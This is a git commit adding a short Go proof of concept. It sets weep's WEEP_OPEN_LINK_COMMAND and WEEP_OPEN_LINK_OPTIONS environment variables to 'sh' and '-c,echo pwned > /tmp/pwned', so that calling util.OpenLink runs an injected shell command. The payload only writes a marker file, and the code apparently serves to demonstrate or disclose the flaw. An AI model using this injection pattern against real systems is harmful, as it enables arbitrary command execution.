d3a147bb7f9ccd9ffc121d3eee7eb0fd38558a8b
JPD-12 <123920978+JPD-12@users.noreply.github.com>
2025-06-06 15:04:20 +0400

    Create main.go

---
+++ main.go
@@ -0,0 +1,24 @@
+package main
+
+import (
+	"fmt"
+	"os"
+	"runtime"
+
+	"github.com/Netflix/weep/pkg/util"
+)
+
+func init() {
+	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
+		os.Setenv("WEEP_OPEN_LINK_COMMAND", "sh")
+		os.Setenv("WEEP_OPEN_LINK_OPTIONS", "-c,echo pwned > /tmp/pwned")
+	}
+}
+
+func main() {
+	fmt.Println("Running OpenLink with injected options...")
+	err := util.OpenLink("https://example.com")
+	if err != nil {
+		fmt.Printf("Error: %v\n", err)
+	}
+}
